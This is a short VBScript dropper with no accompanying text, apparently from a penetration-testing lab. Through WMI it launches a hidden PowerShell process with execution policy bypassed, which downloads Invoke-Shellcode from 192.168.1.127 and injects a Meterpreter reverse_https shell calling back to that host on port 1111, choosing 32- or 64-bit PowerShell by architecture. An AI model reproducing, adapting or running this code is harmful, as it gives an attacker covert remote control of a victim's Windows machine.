Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")

Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")

Dim filesys




Const HIDDEN_WINDOW = 0

 If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 32 Then
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                 objProcess.Create "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force", Null, objConfig, intProcessID



           Else
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                objProcess.Create "C:\\WINDOWS\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force", Null, objConfig, intProcessID

                
           End If
